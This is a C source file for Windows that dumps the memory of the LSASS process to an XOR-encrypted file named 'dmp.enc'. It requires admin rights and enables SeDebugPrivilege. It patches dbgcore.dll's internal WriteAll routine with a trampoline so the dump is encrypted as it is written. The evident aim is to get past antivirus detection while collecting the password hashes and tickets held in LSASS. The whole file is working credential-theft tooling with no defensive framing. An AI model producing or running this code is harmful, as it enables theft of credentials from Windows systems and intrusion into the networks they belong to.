#include <Windows.h>
#include <stdio.h>
#include <DbgHelp.h>
#include <tlhelp32.h>

#pragma comment (lib, "Dbghelp.lib")

unsigned char XOR_KEY = 0xb0;
int LSASS_PID;

intptr_t writeAll_abs;
HANDLE hProcess;
HANDLE our_dmp_handle;
SOCKET s;

char overwritten_writeAll[13];

// all those 0x00 will be replaced by the trampoline function address
char trampoline_assembly[13] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, trampoline address
    0x41, 0xFF, 0xE2                                                    // jmp r10
};

unsigned char* encrypt(void* buffer, long long size, char key) {
    unsigned char* new_buff = (unsigned char*)malloc(size);
    for (long long i = 0; i < size; ++i) {
        new_buff[i] = *(((unsigned char*)buffer) + i) ^ key;
    }
    return new_buff;
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = { 0 };
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL SetDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

    const wchar_t* lpwPriv = L"SeDebugPrivilege";
    if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
        CloseHandle(hToken);
        printf("I dont have SeDebugPirvs\n");
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        printf("Could not adjust to SeDebugPirvs\n");

        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}


void minidumpThis(HANDLE hProc)
{
    our_dmp_handle = CreateFileA("dmp.enc", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!our_dmp_handle) {
        printf("Unable to create minidump file\n");
    } else
    {
        DWORD lsassPid = GetProcessId(hProc);
        printf("Got PID:: %i\n", lsassPid);
        BOOL Result = MiniDumpWriteDump(hProc, lsassPid, our_dmp_handle, MiniDumpWithFullMemory, NULL, NULL, NULL);
        CloseHandle(our_dmp_handle);

        if (!Result) {
            printf("Minidump failed\n");
        }
    }

    return;
}

UINT32 writetrampoline(HANDLE file_handler, void* buffer, INT64 size) {
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &overwritten_writeAll, sizeof(overwritten_writeAll), NULL);

    long high_dword = NULL;
    DWORD low_dword = SetFilePointer(our_dmp_handle, NULL, &high_dword, FILE_CURRENT);
    long pos = high_dword << 32 | low_dword;

    unsigned char* new_buff = (unsigned char*)buffer;
    new_buff = encrypt(buffer, size, XOR_KEY);

    UINT32 ret = ((UINT32(*)(HANDLE, void*, INT64))(writeAll_abs))(file_handler, (void*)new_buff, size); //restorting WriteAll pointer
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &trampoline_assembly, sizeof(trampoline_assembly), NULL);

    return ret;
}

DWORD get_lsass_pid() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        while (Process32Next(snapshot, &processEntry)) {
            if (wcscmp(processEntry.szExeFile, L"lsass.exe") == 0) {
                return processEntry.th32ProcessID;
            }
        }
    }
}

int main(int argc, char* args[]) {
    if (!IsElevated()) {
        printf("[-] Requires admin privileges\n");
        return 0;
    }
    if (!SetDebugPrivilege()) {
        printf("[-] Requires debug privileges\n");
        return 0;
    }
    LSASS_PID = get_lsass_pid();

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());

    const char* dbgcore_name = "dbgcore.dll"; // 00007FFF8FC90000
    intptr_t dbgcore_handle = (intptr_t)LoadLibraryA(dbgcore_name);

    intptr_t writeAll_offset = 0xc6f0; // offset to WriteAll winapi in dbgcore.dll
    writeAll_abs = dbgcore_handle + writeAll_offset; //00007FF8B4FF0000 + 0xc6f0 = 00007FF8B4FFC6F0
    printf("Dbgcore Handle/Base Address (writeAll_offset): %p\n", writeAll_abs);

    printf("writetrampoline Addr: %p\n", writetrampoline);
    void* trampoline_address = (void*)writetrampoline;
    memcpy(&trampoline_assembly[2], &trampoline_address, sizeof(trampoline_address));

    memcpy(overwritten_writeAll, (void*)writeAll_abs, sizeof(overwritten_writeAll));
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &trampoline_assembly, sizeof(trampoline_assembly), NULL);

    HANDLE lsassProcess_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LSASS_PID);
    minidumpThis(lsassProcess_handle);
    CloseHandle(lsassProcess_handle);

    return 0;
}
